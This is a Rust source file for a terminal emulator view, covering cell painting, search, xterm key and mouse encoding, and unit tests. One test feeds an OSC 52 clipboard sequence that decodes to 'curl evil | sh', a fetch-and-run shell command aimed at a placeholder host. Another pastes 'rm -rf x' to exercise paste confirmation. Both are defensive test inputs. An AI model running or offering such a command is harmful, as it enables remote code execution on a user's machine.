        (point.line >= g.topmost_line() && point.line <= g.bottommost_line() && point.column.0 < self.term.columns())
            .then(|| g[point].hyperlink().map(|h| h.uri().to_string()))
            .flatten()
    }

    #[allow(clippy::too_many_arguments)]
    fn paint(&mut self, ui: &mut Ui, rect: Rect, origin: Pos2, font: &FontId, cw: f32, ch: f32, theme: &TermTheme, focused: bool) {
        let painter = ui.painter_at(rect);
        let bg_default = rgb(theme.background);
        painter.rect_filled(rect, 0.0, bg_default);
        let offset = self.term.grid().display_offset() as i32;
        let selection = self.term.selection.as_ref().and_then(|s| s.to_range(&self.term));
        let sel_bg = rgb(theme.selection);
        self.refresh_find();
        let finds: Vec<(i32, usize, usize, bool)> =
            self.find.as_ref().map(|f| f.matches.iter().enumerate().map(|(i, &(l, a, b))| (l, a, b, i == f.current)).collect()).unwrap_or_default();
        let ncols = self.cols as usize;
        for vr in 0..self.rows as i32 {
            let line = Line(vr - offset);
            if line.0 > self.term.grid().bottommost_line().0 {
                break;
            }
            let y = origin.y + vr as f32 * ch;
            let row = &self.term.grid()[line];
            let mut run = String::new();
            let mut run_x = 0.0;
            let mut run_color = Color32::TRANSPARENT;
            let flush = |run: &mut String, x: f32, color: Color32| {
                if !run.trim().is_empty() {
                    painter.text(pos2(x, y), egui::Align2::LEFT_TOP, run.as_str(), font.clone(), color);
                }
                run.clear();
            };
            for c in 0..ncols.min(self.term.columns()) {
                let cell = &row[Column(c)];
                if cell.flags.contains(Flags::WIDE_CHAR_SPACER) {
                    continue;
                }
                let bold = cell.flags.contains(Flags::BOLD);
                let mut fg = self.color(cell.fg, theme, bold);
                let mut bg = self.color(cell.bg, theme, false);
                if cell.flags.contains(Flags::INVERSE) {
                    std::mem::swap(&mut fg, &mut bg);
                }
                if cell.flags.contains(Flags::DIM) {
                    fg = fg.gamma_multiply(0.66);
                }
                let point = Point::new(line, Column(c));
                let width = if cell.flags.contains(Flags::WIDE_CHAR) { 2.0 } else { 1.0 };
                let x = origin.x + c as f32 * cw;
                let cell_rect = Rect::from_min_size(pos2(x, y), vec2(cw * width, ch));
                if selection.as_ref().is_some_and(|s| s.contains(point)) {
                    bg = sel_bg;
                } else if let Some(&(_, _, _, cur)) = finds.iter().find(|(l, a, b, _)| *l == line.0 && (*a..=*b).contains(&c)) {
                    bg = if cur { Color32::from_rgb(255, 160, 40) } else { Color32::from_rgba_unmultiplied(255, 200, 60, 110) };
                    if cur {
                        fg = Color32::BLACK;
                    }
                }
                if bg != bg_default {
                    painter.rect_filled(cell_rect, 0.0, bg);
                }
                if cell.flags.intersects(Flags::ALL_UNDERLINES) {
                    painter.hline(cell_rect.x_range(), y + ch - 1.5, Stroke::new(1.0, fg));
                } else if cell.hyperlink().is_some() {
                    // OSC 8 links: a dotted underline.
                    let mut x0 = cell_rect.left();
                    while x0 < cell_rect.right() {
                        painter.hline(x0..=(x0 + 1.5).min(cell_rect.right()), y + ch - 1.5, Stroke::new(1.0, fg.gamma_multiply(0.8)));
                        x0 += 3.0;
                    }
                }
                if cell.flags.contains(Flags::STRIKEOUT) {
                    painter.hline(cell_rect.x_range(), y + ch * 0.55, Stroke::new(1.0, fg));
                }
                let hidden = cell.flags.contains(Flags::HIDDEN);
                let chr = if hidden { ' ' } else { cell.c };
                // ASCII runs share one text call; anything else (including ASCII with combining
                // marks) is placed on its own cell so a fallback font's advance can't push later
                // glyphs off the grid.
                let plain = chr.is_ascii() && width == 1.0 && cell.zerowidth().is_none();
                if plain && fg == run_color && !run.is_empty() {
                    run.push(chr);
                    continue;
                }
                flush(&mut run, run_x, run_color);
                if plain {
                    run.push(chr);
                    run_x = x;
                    run_color = fg;
                } else if chr != ' ' {
                    let mut s = String::from(chr);
                    if let Some(z) = cell.zerowidth() {
                        s.extend(z);
                    }
                    // Top-anchored like the ASCII runs: centring vertically in the (rounded-up)
                    // cell height drew accented and other non-ASCII glyphs below the baseline.
                    painter.text(pos2(cell_rect.center().x, y), egui::Align2::CENTER_TOP, s, font.clone(), fg);
                }
            }
            flush(&mut run, run_x, run_color);
        }

        // Cursor.
        let mode = *self.term.mode();
        let cur = self.term.grid().cursor.point;
        let vr = cur.line.0 + offset;
        if mode.contains(TermMode::SHOW_CURSOR) && (0..self.rows as i32).contains(&vr) {
            let blink_on = !focused || (ui.input(|i| i.time) * 1.9) as i64 % 2 == 0;
            if focused {
                ui.ctx().request_repaint_after(std::time::Duration::from_millis(530));
            }
            let r = Rect::from_min_size(pos2(origin.x + cur.column.0 as f32 * cw, origin.y + vr as f32 * ch), vec2(cw, ch));
            let c = rgb(theme.cursor);
            let shape = match self.term.cursor_style().shape {
                CursorShape::Underline => CursorStyle::Underline,
                CursorShape::Beam => CursorStyle::Bar,
                CursorShape::Block if self.term.cursor_style() == alacritty_terminal::vte::ansi::CursorStyle::default() => self.cursor,
                _ => CursorStyle::Block,
            };
            if !focused {
                painter.rect_stroke(r, 0.0, Stroke::new(1.0, c), egui::StrokeKind::Inside);
            } else if blink_on {
                match shape {
                    CursorStyle::Block => {
                        painter.rect_filled(r, 0.0, c);
                        let cell = &self.term.grid()[cur.line][cur.column];
                        if cell.c != ' ' {
                            painter.text(r.left_top(), egui::Align2::LEFT_TOP, cell.c, font.clone(), rgb(theme.cursor_accent));
                        }
                    }
                    CursorStyle::Underline => {
                        painter.rect_filled(Rect::from_min_max(pos2(r.left(), r.bottom() - 2.0), r.max), 0.0, c);
                    }
                    CursorStyle::Bar => {
                        painter.rect_filled(Rect::from_min_size(r.min, vec2(2.0, ch)), 0.0, c);
                    }
                }
            }
        }
        // Scroll position indicator when looking at history.
        if offset > 0 {
            let total = (self.term.grid().history_size() + self.rows as usize) as f32;
            let h = (rect.height() * self.rows as f32 / total).max(16.0);
            let top = rect.top() + (rect.height() - h) * (1.0 - offset as f32 / self.term.grid().history_size().max(1) as f32);
            painter.rect_filled(Rect::from_min_size(pos2(rect.right() - 5.0, top), vec2(3.0, h)), 2.0, rgb(theme.foreground).gamma_multiply(0.35));
        }
    }

    // --- find ---------------------------------------------------------------------------

    fn refresh_find(&mut self) {
        let generation = self.generation;
        let Some(f) = &self.find else { return };
        let key = (f.query.clone(), f.case_sensitive, f.regex, generation);
        if f.computed_for.as_ref() == Some(&key) {
            return;
        }
        let pattern = if f.regex { f.query.clone() } else { regex::escape(&f.query) };
        let pattern = if f.case_sensitive { pattern } else { format!("(?i){pattern}") };
        let mut matches = vec![];
        let mut error = None;
        if !f.query.is_empty() {
            match regex::Regex::new(&pattern) {
                Ok(re) => {
                    let g = self.term.grid();
                    for l in g.topmost_line().0..=g.bottommost_line().0 {
                        let (text, cols) = self.line_text(Line(l));
                        for m in re.find_iter(&text) {
                            if m.as_str().is_empty() {
                                continue;
                            }
                            let a = text[..m.start()].chars().count();
                            let b = a + m.as_str().chars().count() - 1;
                            if let (Some(&ca), Some(&cb)) = (cols.get(a), cols.get(b)) {
                                matches.push((l, ca, cb));
                            }
                        }
                    }
                }
                Err(e) => error = Some(e.to_string()),
            }
        }
        let f = self.find.as_mut().unwrap();
        let had = f.matches.len();
        f.matches = matches;
        f.error = error;
        if had == 0 || f.current >= f.matches.len() {
            f.current = f.matches.len().saturating_sub(1);
        }
        f.computed_for = Some(key);
    }

    /// Moves to the next (or previous) match and scrolls it into view.
    pub fn find_step(&mut self, forward: bool) {
        self.refresh_find();
        let Some(f) = &mut self.find else { return };
        if f.matches.is_empty() {
            return;
        }
        let n = f.matches.len();
        f.current = if forward { (f.current + 1) % n } else { (f.current + n - 1) % n };
        let line = f.matches[f.current].0;
        self.reveal(line);
    }

    fn reveal(&mut self, line: i32) {
        let offset = self.term.grid().display_offset() as i32;
        let rows = self.rows as i32;
        let vr = line + offset;
        if !(0..rows).contains(&vr) {
            let target = (rows / 2 - line).clamp(0, self.term.grid().history_size() as i32);
            self.term.scroll_display(Scroll::Delta(target - offset));
        }
    }

    pub fn find_counts(&self) -> (usize, usize) {
        self.find.as_ref().map_or((0, 0), |f| (if f.matches.is_empty() { 0 } else { f.current + 1 }, f.matches.len()))
    }
}

/// xterm encoding of a mouse event at 0-based cell (c, r).
fn mouse_report(button: u8, c: u32, r: u32, pressed: bool, mode: TermMode) -> Vec<u8> {
    if mode.contains(TermMode::SGR_MOUSE) {
        format!("\x1b[<{button};{};{}{}", c + 1, r + 1, if pressed { 'M' } else { 'm' }).into_bytes()
    } else {
        let b = if pressed { button } else { 3 };
        let enc = |v: u32| (32 + v + 1).min(255) as u8;
        vec![0x1b, b'[', b'M', 32 + b, enc(c), enc(r)]
    }
}

/// Bytes an xterm sends for a non-text key.
pub fn key_bytes(key: Key, m: Modifiers, mode: TermMode) -> Option<Vec<u8>> {
    let app_cursor = mode.contains(TermMode::APP_CURSOR);
    let mods = 1 + (m.shift as u8) + 2 * (m.alt as u8) + 4 * (m.ctrl as u8);
    let csi = |final_: char| -> Vec<u8> {
        if mods > 1 {
            format!("\x1b[1;{mods}{final_}").into_bytes()
        } else if app_cursor {
            format!("\x1bO{final_}").into_bytes()
        } else {
            format!("\x1b[{final_}").into_bytes()
        }
    };
    let tilde = |n: u8| -> Vec<u8> { if mods > 1 { format!("\x1b[{n};{mods}~") } else { format!("\x1b[{n}~") }.into_bytes() };
    let ss3 = |final_: char| -> Vec<u8> { if mods > 1 { format!("\x1b[1;{mods}{final_}").into_bytes() } else { format!("\x1bO{final_}").into_bytes() } };
    let esc = |b: &[u8]| -> Vec<u8> {
        let mut v = if m.alt { vec![0x1b] } else { vec![] };
        v.extend_from_slice(b);
        v
    };
    Some(match key {
        Key::Enter => esc(b"\r"),
        Key::Backspace => esc(if m.ctrl { b"\x08" } else { b"\x7f" }),
        Key::Tab if m.shift => b"\x1b[Z".to_vec(),
        Key::Tab => b"\t".to_vec(),
        Key::Escape => b"\x1b".to_vec(),
        Key::ArrowUp => csi('A'),
        Key::ArrowDown => csi('B'),
        Key::ArrowRight => csi('C'),
        Key::ArrowLeft => csi('D'),
        Key::Home => csi('H'),
        Key::End => csi('F'),
        Key::Insert => tilde(2),
        Key::Delete => tilde(3),
        Key::PageUp => tilde(5),
        Key::PageDown => tilde(6),
        Key::F1 => ss3('P'),
        Key::F2 => ss3('Q'),
        Key::F3 => ss3('R'),
        Key::F4 => ss3('S'),
        Key::F5 => tilde(15),
        Key::F6 => tilde(17),
        Key::F7 => tilde(18),
        Key::F8 => tilde(19),
        Key::F9 => tilde(20),
        Key::F10 => tilde(21),
        Key::F11 => tilde(23),
        Key::F12 => tilde(24),
        _ if m.ctrl && !mac_cmd_only(m) => {
            let b = match key {
                Key::Space | Key::Num2 => 0,
                Key::OpenBracket | Key::Num3 => 0x1b,
                Key::Backslash | Key::Num4 => 0x1c,
                Key::CloseBracket | Key::Num5 => 0x1d,
                Key::Num6 => 0x1e,
                Key::Slash | Key::Minus | Key::Num7 => 0x1f,
                Key::Num8 => 0x7f,
                k => {
                    let name = k.name();
                    let c = name.chars().next().filter(|c| name.len() == 1 && c.is_ascii_alphabetic())?;
                    (c.to_ascii_uppercase() as u8) & 0x1f
                }
            };
            esc(&[b])
        }
        _ if m.alt && !m.ctrl && !cfg!(target_os = "macos") => return None, // arrives as Text with ESC prefix
        _ => return None,
    })
}

/// On macOS Cmd is the app's modifier while Ctrl still produces control codes.
fn mac_cmd_only(m: Modifiers) -> bool {
    cfg!(target_os = "macos") && m.mac_cmd && !m.ctrl
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn keys_encode_like_xterm() {
        let none = Modifiers::NONE;
        assert_eq!(key_bytes(Key::ArrowUp, none, TermMode::empty()).unwrap(), b"\x1b[A");
        assert_eq!(key_bytes(Key::ArrowUp, none, TermMode::APP_CURSOR).unwrap(), b"\x1bOA");
        assert_eq!(key_bytes(Key::ArrowLeft, Modifiers::CTRL, TermMode::empty()).unwrap(), b"\x1b[1;5D");
        assert_eq!(key_bytes(Key::C, Modifiers::CTRL, TermMode::empty()).unwrap(), [3]);
        // egui reports Ctrl as ctrl + command on Linux/Windows; it must still send a control code.
        let ctrl_cmd = Modifiers { ctrl: true, command: true, ..Default::default() };
        assert_eq!(key_bytes(Key::D, ctrl_cmd, TermMode::empty()).unwrap(), [4]);
        assert_eq!(key_bytes(Key::F5, none, TermMode::empty()).unwrap(), b"\x1b[15~");
        assert_eq!(key_bytes(Key::Backspace, none, TermMode::empty()).unwrap(), [0x7f]);
        assert!(key_bytes(Key::A, none, TermMode::empty()).is_none());
    }

    #[test]
    fn remote_clipboard_and_multiline_paste_go_to_the_app() {
        let mut t = TermView::new(1000, 14.0, CursorStyle::Block);
        t.feed(b"\x1b]52;c;Y3VybCBldmlsIHwgc2g=\x07");
        let ctx = egui::Context::default();
        let mut out = None;
        let mut full = ctx.run_ui(Default::default(), |ui| out = Some(t.ui(ui, crate::terminal_themes::get("charcoal"), true)));
        full.textures_delta.clear();
        assert_eq!(out.unwrap().clipboard.as_deref(), Some("curl evil | sh"));
        assert!(!full.platform_output.commands.iter().any(|c| matches!(c, egui::OutputCommand::CopyText(_))), "the view must not touch the clipboard itself");

        let mut out = TermResponse::default();
        t.confirm_paste = true;
        t.paste("ls\nrm -rf x\n", &mut out);
        assert!(out.input.is_empty());
        assert_eq!(out.confirm_paste.as_deref(), Some("ls\nrm -rf x\n"));
        let mut out = TermResponse::default();
        t.paste("one line", &mut out);
        assert_eq!(out.input, b"one line");
        t.feed(b"\x1b[?2004h");
        let mut out = TermResponse::default();
        t.paste("a\nb", &mut out);
        assert!(out.confirm_paste.is_none() && out.input.starts_with(b"\x1b[200~"), "bracketed paste needs no prompt");
    }

    #[test]
    fn shell_integration_marks_survive_a_full_scrollback() {
        // Scrollback of 30 lines, so the history fills and rotates during the test.
        let mut t = TermView::new(30, 14.0, CursorStyle::Block);
        let prompt = |t: &mut TermView| t.feed(b"\x1b]133;A\x07$ \x1b]133;B\x07");
        let run = |t: &mut TermView, cmd: &str, out: &[String], code: i32| {
            t.feed(format!("{cmd}\r\n\x1b]133;C\x07").as_bytes());
            for l in out {
                t.feed(format!("{l}\r\n").as_bytes());
            }
            t.feed(format!("\x1b]133;D;{code}\x07").as_bytes());
        };
        prompt(&mut t);
        run(&mut t, "seq 3", &["1".into(), "2".into(), "3".into()], 0);
        prompt(&mut t);
        assert_eq!(t.last_output().as_deref(), Some("1\n2\n3"));
        let many: Vec<String> = (0..80).map(|i| format!("line {i}")).collect();
        run(&mut t, "big", &many, 3);
        prompt(&mut t);
        run(&mut t, "tail", &["a".into(), "b".into()], 1);
        prompt(&mut t);
        assert_eq!(t.last_output().as_deref(), Some("a\nb"), "rotation must not shift the marks");
        let last = t.prompts.iter().rev().nth(1).unwrap();
        assert_eq!(last.exit, Some(1));
        assert_eq!(t.line_text(t.line_of(last.prompt)).0.trim_end(), "$ tail");
        // Jumping back lands an earlier prompt (still in the scrollback) at the top of the view.
        let more: Vec<String> = (0..20).map(|i| format!("more {i}")).collect();
        run(&mut t, "more", &more, 0);
        prompt(&mut t);
        assert!(t.jump_prompt(false));
        let top = Line(-(t.term.grid().display_offset() as i32));
        assert!(t.line_text(top).0.starts_with("$ "), "{:?}", t.line_text(top).0);
        // A cleared scrollback drops the marks with it.
        t.feed(b"\x1b[3J\x1b[2J");
        t.feed(b"x\r\n");
        assert!(t.prompts.len() <= 1);
    }

    #[test]
    fn osc8_links_are_found_on_their_cells() {
        let mut t = TermView::new(100, 14.0, CursorStyle::Block);
        t.feed(b"see \x1b]8;;https://example.com/docs\x1b\\the docs\x1b]8;;\x1b\\ now");
        let at = |c| t.hyperlink_at(Point::new(Line(0), Column(c)));
        assert_eq!(at(4).as_deref(), Some("https://example.com/docs"));
        assert_eq!(at(11).as_deref(), Some("https://example.com/docs"));
        assert_eq!(at(12), None, "the link ends with its text");
        assert_eq!(at(0), None);
    }

    #[test]
    fn inline_images_reserve_rows_and_respect_width() {
        use base64::Engine;
        let mut png = Vec::new();
        image::RgbaImage::from_pixel(40, 32, image::Rgba([255, 0, 0, 255])).write_to(&mut std::io::Cursor::new(&mut png), image::ImageFormat::Png).unwrap();
        let b64 = base64::engine::general_purpose::STANDARD.encode(&png);
        let mut t = TermView::new(100, 14.0, CursorStyle::Block);
        t.cell_px = (8.0, 16.0);
        t.feed(format!("x\r\n\x1b]1337;File=inline=1;width=10:{b64}\x07after").as_bytes());
        let img = &t.images[0];
        // 10 cells wide (80 px) keeps the 40x32 aspect: 64 px = 4 rows; the text continues below.
        assert_eq!((img.col, img.cols, img.rows), (0, 10, 4));
        assert_eq!(t.line_of(img.stable), Line(1));
        assert_eq!(t.term.grid().cursor.point.line, Line(5));
        assert!(t.line_text(Line(5)).0.starts_with("after"));
        // Garbage is ignored rather than placed.
        t.feed(b"\x1b]1337;File=inline=1:bm90IGFuIGltYWdl\x07");
        assert_eq!(t.images.len(), 1);
    }

    #[test]
    fn feeds_text_and_finds_it() {
        let mut t = TermView::new(1000, 14.0, CursorStyle::Block);
        t.feed(b"hello \x1b[31mworld\x1b[0m\r\nsecond world\r\n");
        assert!(t.buffer_text().starts_with("hello world\nsecond world"));
        t.find = Some(Find { query: "WORLD".into(), ..Default::default() });
        t.refresh_find();
        assert_eq!(t.find_counts().1, 2);
        t.find.as_mut().unwrap().case_sensitive = true;
        t.refresh_find();
        assert_eq!(t.find_counts().1, 0);
    }

    #[test]
    fn replies_to_device_attributes() {
        let mut t = TermView::new(10, 14.0, CursorStyle::Block);
        t.feed(b"\x1b[6n");
        let ev = t.events.0.lock();
        assert!(ev.iter().any(|e| matches!(e, TermEvent::PtyWrite(s) if s == "\x1b[1;1R")));
    }

    #[test]
    fn mouse_reports() {
        assert_eq!(mouse_report(0, 0, 0, true, TermMode::SGR_MOUSE), b"\x1b[<0;1;1M");
        assert_eq!(mouse_report(0, 2, 3, true, TermMode::empty()), vec![0x1b, b'[', b'M', 32, 35, 36]);
    }
}

#[cfg(test)]
mod perf {
    /// `cargo test --release -p nexus perf -- --ignored --nocapture`
    #[test]
    #[ignore]
    fn feed_throughput() {
        let mut t = super::TermView::new(10_000, 14.0, super::CursorStyle::Block);
        let line = b"drwxr-xr-x  22 root root   4096 Oct  1 00:01 \x1b[01;34msome-directory-name\x1b[0m and more text\r\n";
        let chunk: Vec<u8> = line.iter().copied().cycle().take(64 * 1024).collect();
        let total = 50 * 1024 * 1024;
        let start = std::time::Instant::now();
        let mut n = 0;
        while n < total {
            t.feed(&chunk);
            n += chunk.len();
        }
        let secs = start.elapsed().as_secs_f64();
        eprintln!("fed {} MiB in {secs:.2}s = {:.0} MiB/s", total >> 20, (total >> 20) as f64 / secs);
        assert!(secs < 30.0, "too slow even allowing for a loaded machine");
    }
}
